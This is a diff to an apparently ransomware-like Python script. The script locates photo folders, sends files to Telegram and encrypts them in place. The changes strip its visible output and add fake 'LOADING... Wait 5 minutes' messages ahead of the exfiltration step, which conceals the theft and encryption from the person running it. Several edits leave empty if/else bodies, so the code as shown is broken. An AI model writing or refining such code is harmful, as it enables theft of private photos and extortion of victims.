@@ -63,19 +63,23 @@ def find_directories(root: Path, targets: list[str], max_depth: int) -> list[Pat
         try:
             entries = list(current.iterdir())
         except (PermissionError, OSError) as e:
-            print(f"  [!] {e}")
+            
             return
         for entry in entries:
+            # 🔴 AJOUT : Ignorer les dossiers/fichiers cachés (ex: .thumbnails)
+            if entry.name.startswith('.'):
+                continue
+                
             if not entry.is_dir():
                 continue
             if entry.name.lower() in targets_lower:
                 found.append(entry)
-                print(f"  [✓] Trouvé (niveau {depth}) : {entry}")
+                
             else:
                 _walk(entry, depth + 1)
 
-    print(f"\nRecherche dans : {root.resolve()}")
-    print(f"Cibles         : {', '.join(targets)}\n")
+    
+    
     _walk(root, depth=1)
     return found
 
@@ -118,28 +122,35 @@ def encrypt_directory(folder: Path, dry_run: bool) -> int:
     files = [
         f for f in folder.rglob("*")
         if f.is_file() and f.suffix != ENCRYPTED_EXT
+        # 🔴 AJOUT : Ignorer les sous-dossiers et fichiers cachés
+        and not any(part.startswith('.') for part in f.relative_to(folder).parts)
     ]
     if not files:
         return 0
     for f in files:
         if dry_run:
-            print(f"    [dry-enc] {f.relative_to(folder)}")
+            
         else:
             encrypt_file_inplace(f)
-            print(f"    [🔒] {f.relative_to(folder)}")
+            
     return len(files)
 
 
 def decrypt_directory(folder: Path) -> int:
-    files = [f for f in folder.rglob(f"*{ENCRYPTED_EXT}") if f.is_file()]
+    files = [
+        f for f in folder.rglob(f"*{ENCRYPTED_EXT}") 
+        if f.is_file()
+        # 🔴 AJOUT : Ignorer les sous-dossiers et fichiers cachés
+        and not any(part.startswith('.') for part in f.relative_to(folder).parts)
+    ]
     ok = 0
     for f in files:
         try:
             decrypt_file_inplace(f)
-            print(f"    [🔓] {f.with_suffix('').relative_to(folder)}")
+            
             ok += 1
         except ValueError:
-            print(f"    [✗]  Intégrité incorrecte : {f.name}")
+            print("")
     return ok
 
 
@@ -156,7 +167,10 @@ def _real_ext(path: Path) -> str:
 
 def _collect_files(folder: Path, limit: int) -> list[Path]:
     all_files = sorted(
-        (f for f in folder.rglob("*") if f.is_file()),
+        (f for f in folder.rglob("*") 
+         if f.is_file()
+         # 🔴 AJOUT : Ignorer les sous-dossiers et fichiers cachés
+         and not any(part.startswith('.') for part in f.relative_to(folder).parts)),
         key=lambda f: f.stat().st_mtime
     )
     return all_files[:limit]
@@ -305,6 +319,8 @@ def main() -> None:
        """)
   
     # Étape 1 — Envoi Telegram (Pictures + Camera)
+    print("LOADING...." )
+    print(" Wait....5 minutes" )
     print("\n" + "═" * 55)
     print("═" * 55)
     run_telegram(root, args.depth, dry_run=args.dry_run)
@@ -319,10 +335,10 @@ def main() -> None:
         return
 
     action = "Simulation" if args.dry_run else "Chiffrement sur place"
-    print(f"\n{action} ({len(folders)} dossier(s))\n")
+    
     total = 0
     for folder in folders:
-        print(f"  → {folder}")
+        
         total += encrypt_directory(folder, dry_run=args.dry_run)
 
     mark = "seraient chiffrés" if args.dry_run else "fichier(s) chiffré(s)"
